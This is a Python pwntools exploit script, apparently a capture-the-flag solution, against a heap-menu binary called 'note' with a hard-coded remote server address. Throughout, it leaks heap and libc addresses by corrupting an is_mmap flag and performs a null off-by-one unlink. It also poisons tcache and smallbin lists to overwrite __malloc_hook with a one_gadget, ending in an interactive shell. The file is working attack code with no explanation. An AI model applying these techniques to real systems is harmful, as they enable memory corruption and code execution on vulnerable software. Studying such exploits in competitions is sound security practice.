#coding:utf-8
from pwn import *
import hashlib
import sys,string

local = 1

# if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'):
    # context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc_debug.so',checksec=False)
one = [0xe237f,0xe2383,0xe2386,0x106ef8]

if local:
    p = process('./note')

else:
    p = remote("124.156.135.103",6004)

def debug(addr=0,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        #print "breakpoint_addr --> " + hex(text_base + 0x202040)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr))) 

sd = lambda s:p.send(s)
rc = lambda s:p.recv(s)
sl = lambda s:p.sendline(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)


def info(name,addr):
    log.info(name + " --> %s",hex(addr))

def add(idx,size):
    sla("Choice: ",'1')
    sla("Index: ",str(idx))
    sla("Size: ",str(size))


def delete(idx):
    sla("Choice: ",'2')
    sla("Index: ",str(idx))

def show(idx):
    sla("Choice: ",'3')
    sla("Index: ",str(idx))

def edit(idx,data):
    sla("Choice: ",'4')
    sla("Index: ",str(idx))
    sla("Message: \n",data)

def super_edit(idx,data):
    sla("Choice: ",'7')
    sla("Index: ",str(idx))
    sda("Message: \n",data)

def get_money():
    sla("Choice: ",'1')
    sla("Index: ",str(0))
    sla("Size: ",'21524788884141834')
    delete(0)

def super_buy(data):
    sla("Choice: ",'6')
    sla("name: \n",data)


# get enough money
get_money()

# leak heap and libc address
add(0,0x80)
add(1,0x500)
add(2,0x80)
delete(1)

add(1,0x600) #now 0x510 in largebin

pay = 0x88*b'\x00' + p64(0x510+1+2)
super_edit(0,pay) # overwrite is_mmap flag 

add(3,0x500)

show(3)
rc(8)
# libc_base = u64(rc(8)) - 0x1eb010
libc_base = u64(rc(8)) - 0x1e50d0
heap_base = u64(rc(8)) - 0x320 



malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
realloc = libc_base + libc.symbols['realloc']
onegadget = libc_base + one[3]

# fill tcache 0x90
delete(0)
delete(1)
delete(2)
for i in range(5):
    add(0,0x80)
    delete(0)
# fill tcache 0x60
for i in range(5):
    add(0,0x50)
    delete(0)

# fill tcache 0x230
for i in range(7):
    add(0,0x220)
    delete(0)
# set a 0x60 to smallbin 
add(0,0x420)
add(1,0x10)
delete(0)
add(0,0x3c0)
add(2,0x60)

# null off by one to unlink
target = heap_base + 0x2220 #unlink target
pay = b''
pay += p64(0)
pay += p64(0x231)
pay += p64(target - 0x18)
pay += p64(target - 0x10)
pay += p64(target) #ptr
add(4,0x80)
edit(4,pay)

add(5,0x80)
edit(5,p64(heap_base+0x2190))

add(6,0x80)
add(7,0x80)

add(8,0x5f0) # will be freed and consolidate with topchunk
delete(7)
pay = 0x80*b'\x00' + p64(0x230)
add(7,0x88)
edit(7,pay)

delete(8) #unlink
add(8,0x220)
add(9,0x90)
delete(8)
add(8,0x1c0)
add(10,0x60)

pay = b'a'*0x20 + p64(0) + p64(0x61)
pay += p64(heap_base + 0x2090)
pay += p64(malloc_hook - 0x38)
edit(7,pay)
info("libc_base",libc_base)
info("heap_base",heap_base)

add(11,0x50)
pay = b'\x00'*0x20 + p64(onegadget) + p64(realloc+9)
super_buy(pay)

add(12,0x70)

p.interactive()

